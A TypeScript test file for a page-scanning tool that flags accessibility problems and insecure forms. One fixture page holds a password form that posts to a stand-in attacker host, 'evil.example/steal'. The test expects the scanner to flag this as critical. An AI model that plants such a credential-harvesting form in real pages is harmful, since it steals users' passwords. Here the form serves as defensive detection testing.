import assert from "node:assert/strict";
import test from "node:test";

import { RunDepthSmokes } from "../../src/depth-smokes/run-depth-smokes.js";
import type {
  WorkspaceAuthorizer,
  WorkspaceAuthorizationResult,
  WorkspaceContext,
} from "../../src/requirement-review/public.js";

class AllowingAuthorizer implements WorkspaceAuthorizer {
  authorize(): Promise<WorkspaceAuthorizationResult> {
    return Promise.resolve({
      ok: true,
      value: {
        policy_version: "policy-1",
        effective_permissions: ["discovery:observe"],
        authorized_resource_refs: ["workspace:workspace-depth"],
        decision_evidence: ["policy:allow-depth"],
      },
    });
  }
}

function context(): WorkspaceContext {
  return {
    schema_version: "1.0.0",
    workspace_id: "workspace-depth",
    actor_id: "tester-1",
    actor_type: "human",
    roles: ["qa-operator"],
    permissions: ["discovery:observe"],
    policy_version: "policy-1",
    request_id: "request-1",
    correlation_id: "correlation-1",
    audience: ["qa-intelligence"],
    environment: "test",
    issued_at: "2026-08-10T07:00:00.000Z",
    expires_at: "2026-08-10T09:00:00.000Z",
    issuer: "identity-test",
    integrity_proof: "proof",
  };
}

test("depth smokes flags missing lang, missing img alt as critical, and has_critical", async () => {
  const html = encodeURIComponent(`<!doctype html><html><head></head><body>
    <h1>Broken a11y</h1>
    <img src="x.png"/>
    <form action="http://evil.example/steal"><input type="password" name="p"/></form>
  </body></html>`);
  const skill = new RunDepthSmokes({
    authorizer: new AllowingAuthorizer(),
    clock: { now: () => new Date("2026-08-10T08:00:00.000Z") },
    ids: {
      next: (() => {
        let n = 0;
        return (scope) => `${scope}-${++n}`;
      })(),
    },
  });

  const result = await skill.run({
    operation_id: "op-1",
    workspace_id: "workspace-depth",
    context: context(),
    url: `data:text/html,${html}`,
    stages: ["a11y_subset", "security"],
  });

  assert.equal(result.ok, true, JSON.stringify(result));
  if (!result.ok) return;
  assert.equal(result.value.has_critical, true);
  assert.equal(result.value.summary.critical > 0, true);
  assert.equal(
    result.value.findings.some((f) => f.category === "image_missing_alt" && f.severity === "critical"),
    true,
  );
  assert.equal(
    result.value.findings.some((f) => f.category === "missing_html_lang"),
    true,
  );
  assert.equal(
    result.value.findings.some((f) => f.category === "form_posts_to_http" && f.severity === "critical"),
    true,
  );
});

test("depth smokes clean page has no critical a11y findings", async () => {
  const html = encodeURIComponent(`<!doctype html><html lang="en"><head><title>OK</title></head><body>
    <h1>Fine</h1>
    <img src="x.png" alt="diagram"/>
  </body></html>`);
  const skill = new RunDepthSmokes({
    authorizer: new AllowingAuthorizer(),
    clock: { now: () => new Date("2026-08-10T08:00:00.000Z") },
    ids: {
      next: (() => {
        let n = 0;
        return (scope) => `${scope}-${++n}`;
      })(),
    },
  });

  const result = await skill.run({
    operation_id: "op-1",
    workspace_id: "workspace-depth",
    context: context(),
    url: `data:text/html,${html}`,
    stages: ["a11y_subset"],
  });

  assert.equal(result.ok, true);
  if (!result.ok) return;
  assert.equal(result.value.has_critical, false);
  assert.equal(result.value.findings.length, 0);
});
